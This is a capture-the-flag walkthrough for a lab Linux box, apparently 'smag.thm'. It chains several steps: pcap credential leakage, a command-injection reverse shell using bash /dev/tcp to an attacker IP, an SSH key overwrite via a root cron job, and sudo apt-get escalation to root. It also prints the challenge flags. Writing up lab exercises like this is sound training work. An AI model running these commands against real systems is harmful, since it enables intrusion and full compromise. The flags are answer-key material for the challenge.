Objective: Gain full control (root access) over a target Linux system by exploiting a cron configuration vulnerability and misconfigured sudo privileges.

Operation Steps
1. Reconnaissance
Tool: nmap

Action: Scan the target IP 10.201.100.152 to discover open ports and services.

Commands:

bash
nmap --min-rate 1000 10.201.100.152
nmap -p22,80 -sV -sC -A -O 10.201.100.152
Result: Discovered ports:

22/tcp — OpenSSH 7.2p2 Ubuntu

80/tcp — Apache httpd 2.4.18 (Ubuntu)

2. Web Server Enumeration
Action: Visited http://10.201.100.152 in a browser. Page source and robots.txt revealed no useful information.

Tool: gobuster

Command:

bash
gobuster dir -u http://10.201.100.152/ -w /usr/share/wordlists/dirb/common.txt
Result: Discovered the /mail/ directory.

3. Analysis of /mail/ Directory
Action: Navigated to http://10.201.100.152/mail/ in the browser. Found a file dHJhY2Uy.pcap (network traffic capture).

Download: Downloaded the file via the browser.

4. PCAP File Analysis
Tool: strings, grep

Command:

bash
strings dHJhY2Uy.pcap | grep -i "username\|password\|login\|host\|development"
Result: Found credentials and a domain:

username=helpdesk&password=cH4nG3M3_n0w

Host: development.smag.thm

5. Accessing the Virtual Host
Action: Added the domain to the hosts file:

bash
echo "10.201.100.152 development.smag.thm" | sudo tee -a /etc/hosts
Visited: http://development.smag.thm → found a login page.

Login: Used credentials helpdesk:cH4nG3M3_n0w.

6. Exploiting Command Injection Vulnerability
Discovery: After login, found an "Enter a command" input field.

Preparation: Started a netcat listener on the attacking machine:

bash
nc -lnvp 4444
Sending Reverse Shell:

bash
bash -c 'bash -i >& /dev/tcp/10.201.85.241/4444 0>&1'
Result: Gained access to the system as the www-data user.

7. Shell Stabilization
Commands:

bash
script /dev/null -qc bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
8. Privilege Escalation Path Discovery
User Discovery: ls /home → user jake exists.

Cron Check: cat /etc/crontab → found a vulnerable task:

bash
* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
Permissions Check: ls -la /opt/.backups/ → file jake_id_rsa.pub.backup is world-writable (-rw-rw-rw-).

9. SSH Key Overwrite
Key Generation on Attacker Machine:

bash
ssh-keygen -t rsa -b 4096 -f jake_key
Overwriting the Target File:

bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCr9PMM+5j2S9ClSVbmuDDxB7c21SLyMgXuA/SX12+ZysAwXOdbsNeW07iOu/UFUFsPj1uZ9cZT1WtDys4O31lYtDmee59gr49c+CRliOLm+uTkinsIKX9aqOpKRpsmZEr9YTk4dsU2nEtnucdnvHOMINm/0swJPEcJ7dfsGj8YhhoilDi6JEJeJE6rC+j3/KTl3SRUmlWm1lCi4Dqpa7Vwfx65eC8dnYoMTSUGcbQXW78DKj8ZNk235SxFHp19VzURvd+3H9GM8Pysb9tfsybrceKgCTmL7kuIYnX3J0Gp8x2VDNnPdHtm/w4Wv6JAJLL+4eT8hEknLsNf68nIAUtztVwZz1WEDVOFZUwj9wik87+4OQdTY3fe45RsjmctFb6+8kH7hYZbfNhRUv3dxN90Tbz30KF+rbPW8E2TOMji1lNCRAoRQ+xab/30l39g8FKM3KOarR5HgSktQPq8/Gwvp2et/8m0colWuMGxAHY8NYDpfEemdO6IqdGu47Eb/X1QkEwd5QDe+ijr6/CJsoCfMB3v2m5R+XsBGEBHsv6nlI3BCXt2Xu9HclO1wa3cNaKpu1vTP25op6mhH1qh/wXzvfwEu2oCcHD0VkE8J5LoNn04AoVarDn1lzjwxxzw1I1/N6rtftXqiSizA6VvRoDepqqissgAIlP/6yo9AQTjdQ== root@ip-10-201-85-241' > /opt/.backups/jake_id_rsa.pub.backup
SSH Connection:

bash
ssh -i jake_key jake@10.201.100.152
Result: Successfully logged in as jake. Retrieved the user flag:

bash
cat /home/jake/user.txt
iusGorV7EbmxM5AuIe2w499msaSuqU3j
10. Privilege Escalation to Root
Sudo Rights Check:

bash
sudo -l
Result: User jake can run apt-get without a password.

Exploitation via GTFOBins:

bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
Result: Gained root access. Retrieved the root flag:

bash
cat /root/root.txt
uJr6zRgetaniyHVRqqL58uRasybBKz2T
Conclusion
The "Operation SSH Key Overwrite" project demonstrates a chain of vulnerabilities leading to full system compromise:

Insecure web server configuration (exposure of sensitive data in a PCAP file).

Command injection vulnerability in a web application.

Improper file permissions on an SSH key backup file, allowing overwrite.

Cron job abuse to substitute an authorized key.

Insecure sudo privileges (ability to run apt-get as root), exploited for privilege escalation.
